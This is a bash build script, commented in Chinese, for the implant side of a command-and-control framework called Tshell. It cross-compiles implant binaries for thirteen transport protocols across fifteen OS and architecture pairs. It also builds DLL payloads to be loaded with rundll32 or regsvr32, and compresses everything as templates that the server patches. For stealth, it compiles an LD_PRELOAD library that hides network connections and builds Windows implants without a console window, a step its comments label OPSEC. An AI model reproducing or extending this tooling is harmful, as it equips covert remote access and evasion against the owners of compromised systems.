#!/usr/bin/env bash
# 编译统一 implant 模块（单二进制 cmd/single，build tag 选择传输协议）。
# 12 个协议（http/https/kcp/oss/tcp/websocket/tcp_forward/kcp_forward/ws_forward/
# http_forward/https_forward/dns）+ 多传输（multi，运行时按端点 scheme 切换），
# 交叉编译各 OS/架构，直接放置到服务端模板目录
# Tshell-server/pkg/api/server/{proto}/，供服务端 GenServer 二进制 patch 管线使用。
# 与 build_templates.ps1 功能对齐（12 adapter + DLL 载荷 + 相同 OS/架构矩阵）。
#
# 体积优化：构建使用 -s -w -trimpath -buildvcs=false，并在构建后对模板 gzip 压缩
# （服务端 embed 时只携带压缩数据，二进制体积降至约 1/3；GenServer/WebDelivery
# 读取时按 gzip 魔数自动解压再 patch）。
#
# 用法： bash build_templates.sh
#       TSHELL_TEMPLATE_ARCHES="linux amd64" TSHELL_SKIP_DLL=1 bash build_templates.sh  # CI 子集
# 失败的架构（如 darwin 缺桩函数）保留旧二进制，不覆盖。
set -u

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"  # implant 模块根

# 模板目录（服务端 go:embed 的 server/）：该目录是构建产物且被 .gitignore 忽略，
# 全新检出（CI / 新克隆）里**根本不存在** —— 原来直接 cd 进去取 pwd，cd 失败时
# 变量静默变空，后面 STAGE 就落到 "/.tmpl-stage" 上（CI 里报 mkdir //.tmpl-stage:
# permission denied，13 个协议全失败）。这里显式创建并校验。
SERVER_TEMPLATES="$SCRIPT_DIR/../../Tshell-server/pkg/api/server"
mkdir -p "$SERVER_TEMPLATES" || { echo "FAIL: 无法创建模板目录 $SERVER_TEMPLATES"; exit 1; }
SERVER_TEMPLATES="$(cd "$SERVER_TEMPLATES" && pwd)" || { echo "FAIL: 无法解析模板目录"; exit 1; }

# ============ 预编译隐藏库（hide_net.c，LD_PRELOAD 网络连接隐藏）============
# 由宿主机 gcc 编译并嵌入植入体（go:embed core/commands/hide_preload/so/）。
# 仅宿主机架构；其他架构的植入体运行 hidenet 时提示无预编译库。
echo "===== Building hide_net preload library ====="
if command -v gcc >/dev/null 2>&1; then
  mkdir -p "$SCRIPT_DIR/core/commands/hide_preload/so"
  HOST_ARCH=$(uname -m)
  case "$HOST_ARCH" in
    x86_64) HOST_GOARCH=amd64 ;;
    aarch64|arm64) HOST_GOARCH=arm64 ;;
    i386|i686) HOST_GOARCH=386 ;;
    *) HOST_GOARCH=unknown ;;
  esac
  if [ "$HOST_GOARCH" != "unknown" ]; then
    OUT="$SCRIPT_DIR/core/commands/hide_preload/so/hide_net_linux_${HOST_GOARCH}.so"
    if gcc -shared -fPIC -O2 -o "$OUT" "$SCRIPT_DIR/core/commands/hide_preload/hide_net.c" -ldl 2>/tmp/hide_build_err; then
      echo "OK   hide_net_linux_${HOST_GOARCH}.so -> $OUT"
    else
      echo "FAIL hide_net build: $(head -1 /tmp/hide_build_err)"
    fi
  else
    echo "WARN: 未知宿主机架构 $HOST_ARCH，跳过 hide_net 预编译库"
  fi
else
  echo "WARN: gcc not found - skipping hide_net preload library"
fi

# proto:文件名前缀（websocket 用 ws_；与 ps1 的 $Protos 一致）
PROTOS="http:http https:https kcp:kcp oss:oss tcp:tcp websocket:ws tcp_forward:tcp_forward kcp_forward:kcp_forward ws_forward:ws_forward http_forward:http_forward https_forward:https_forward dns:dns multi:multi"

# OS/架构对（服务端模板集；只保留 Go 工具链支持且依赖可编译的组合）
# - darwin 仅 amd64/arm64；windows 排除 arm（gopsutil 不支持）
# - linux 9 架构全支持（含 mips*/loong64）
ARCHES="darwin amd64 darwin arm64 linux 386 linux amd64 linux arm linux arm64 linux loong64 linux mips linux mips64 linux mips64le linux mipsle windows 386 windows amd64 windows arm64"

# CI 用：门禁（编译/静态检查/单测/可复现构建）只需要模板树"存在"即可通过
# //go:embed server/*，不需要全矩阵，故允许用环境变量缩小构建范围：
#   TSHELL_TEMPLATE_ARCHES="linux amd64"  只构建指定 OS/架构对
#   TSHELL_SKIP_DLL=1                     跳过 DLL（c-shared，需要 mingw）
# 本地发布仍应不带这两个变量跑全量（13 协议 × 15 架构 + DLL）。
ARCHES="${TSHELL_TEMPLATE_ARCHES:-$ARCHES}"
SKIP_DLL="${TSHELL_SKIP_DLL:-0}"

# gzip -9 压缩模板（就地覆盖同名文件：gzip -c 输出临时文件后 mv，
# 避免 gzip -f 生成 file.gz 并删除原文件；服务端按魔数自动解压）
compress_template() {
  gzip -9 -c "$1" > "$1.tmp" 2>/dev/null || return 1
  mv -f "$1.tmp" "$1" || return 1
  return 0
}

# 暂存目录：模板构建过程中的 .new/.tmp 文件不能出现在 pkg/api/server/ 下 ——
# 服务端用 //go:embed server/* 嵌入模板，构建期间哪怕只有几十毫秒存在 .new 文件，
# 并发的 go build/test 都会因为 embed 到不完整的临时文件而失败（实测踩过）。
# 暂存目录放在 pkg/api 下（server/ 之外）：go:embed server/* 不会看到构建中的
# 临时文件。注意：**重建模板期间不要同时构建服务端**——即使文件替换是原子 rename，
# go:embed 的 stat→open 之间仍可能跨越一次替换，报 "unexpected length"。
# 正确顺序：先 build_templates.sh，再构建服务端。
STAGE="$(cd "$SERVER_TEMPLATES/.." && pwd)/.tmpl-stage" || { echo "FAIL: 无法解析暂存目录"; exit 1; }
rm -rf "$STAGE"; mkdir -p "$STAGE"
trap 'rm -rf "$STAGE"' EXIT

ok=0; fail=0
for pp in $PROTOS; do
  proto=${pp%%:*}; prefix=${pp##*:}
  set -- $ARCHES
  while [ $# -gt 0 ]; do
    goos=$1; goarch=$2; shift 2
    # tcp_forward 无 darwin 模板（与 ps1 一致）
    [ "$proto" = "tcp_forward" ] && [ "$goos" = "darwin" ] && continue
    if [ "$goos" = "windows" ]; then ext=".exe"; else ext=""; fi
    mkdir -p "$SERVER_TEMPLATES/$proto"
    out="$SERVER_TEMPLATES/$proto/${prefix}_${goos}_${goarch}${ext}"
    # 【重建修复】构建到临时文件再原子覆盖：模板已是 gzip 内容，go build 拒绝
    # 直接覆盖"非对象文件"（报 already exists and is not an object file）→ 旧模板永不更新。
    # 失败时删除临时文件并保留旧模板（保持"保留旧"语义）。
    tmpout="$STAGE/${prefix}_${goos}_${goarch}${ext}"
    rm -f "$tmpout"
    # OPSEC: Windows EXE 使用 GUI 子系统(-H windowsgui),启动无控制台窗口闪烁(HideConsole 运行时二次隐藏)
    ldflags="-s -w"
    if [ "$goos" = "windows" ]; then
      ldflags="$ldflags -H windowsgui"
    fi
    if GOOS=$goos GOARCH=$goarch CGO_ENABLED=0 go build -buildvcs=false -tags "transport_$proto" -ldflags "$ldflags" -trimpath -o "$tmpout" ./cmd/single 2>/tmp/implant_build_err; then
      if compress_template "$tmpout" && mv -f "$tmpout" "$out"; then
        echo "OK   $proto $goos/$goarch -> ${prefix}_${goos}_${goarch}${ext} (gzip)"
        ok=$((ok+1))
      else
        rm -f "$tmpout"
        echo "FAIL $proto $goos/$goarch (gzip): $?"
        fail=$((fail+1))
      fi
    else
      rm -f "$tmpout"
      echo "FAIL $proto $goos/$goarch (保留旧): $(head -1 /tmp/implant_build_err)"
      fail=$((fail+1))
    fi
  done
done

echo "===== EXE OK=$ok FAIL=$fail ====="

# ============ DLL 载荷模板（rundll32/regsvr32 加载，-buildmode=c-shared）============
# 需要 CGO + C 编译器（Linux 下用 mingw-w64 交叉编译；Windows 下用 mingw/tdm-gcc），
# 仅产出 windows/386 + windows/amd64。无编译器时跳过并提示。
echo ""
echo "===== Building DLL templates (c-shared, needs gcc) ====="

if command -v x86_64-w64-mingw32-gcc >/dev/null 2>&1; then
  CC_x86_64=x86_64-w64-mingw32-gcc; CC_386=i686-w64-mingw32-gcc
elif command -v gcc >/dev/null 2>&1; then
  CC_x86_64=gcc; CC_386=gcc
else
  echo "WARN: gcc not found - skipping DLL templates (install mingw-w64 to enable)"
  CC_x86_64=""; CC_386=""
fi

if [ "$SKIP_DLL" = "1" ]; then
  echo "SKIP: TSHELL_SKIP_DLL=1，跳过 DLL 模板"
elif [ -n "$CC_x86_64" ]; then
  dllOk=0; dllFail=0
  for pp in $PROTOS; do
    proto=${pp%%:*}; prefix=${pp##*:}
    for pa in "windows amd64 $CC_x86_64" "windows 386 $CC_386"; do
      goos=${pa%% *}; rest=${pa#* }; goarch=${rest%% *}; cc=${rest##* }
      mkdir -p "$SERVER_TEMPLATES/$proto"
      out="$SERVER_TEMPLATES/$proto/${prefix}_${goos}_${goarch}.dll"
      # 同 EXE 段：临时文件构建 + 原子覆盖（模板已是 gzip，go build 拒绝直接覆盖非对象文件）
      tmpout="$STAGE/${prefix}_${goos}_${goarch}.dll"
      rm -f "$tmpout"
      if GOOS=$goos GOARCH=$goarch CGO_ENABLED=1 CC=$cc go build -buildvcs=false -tags "transport_$proto dll" -buildmode=c-shared -ldflags "-s -w" -trimpath -o "$tmpout" ./cmd/single 2>/tmp/implant_build_err; then
        rm -f "${out%.dll}.h"  # 清理 c-shared 伴随生成的 .h 文件
        if compress_template "$tmpout" && mv -f "$tmpout" "$out"; then
          echo "OK   DLL $proto $goos/$goarch -> ${prefix}_${goos}_${goarch}.dll (gzip)"
          dllOk=$((dllOk+1))
        else
          rm -f "$tmpout"
          echo "FAIL DLL $proto $goos/$goarch (gzip)"
          dllFail=$((dllFail+1))
        fi
      else
        rm -f "$tmpout"
        echo "FAIL DLL $proto $goos/$goarch (保留旧): $(head -1 /tmp/implant_build_err)"
        dllFail=$((dllFail+1))
      fi
    done
  done
  echo "===== DLL OK=$dllOk FAIL=$dllFail ====="
  echo "Note: DLL templates need gcc; rundll32 payload.dll,Run / regsvr32 payload.dll"
fi

echo "注：tcp_forward 无 darwin 模板（跳过保留旧二进制）。"
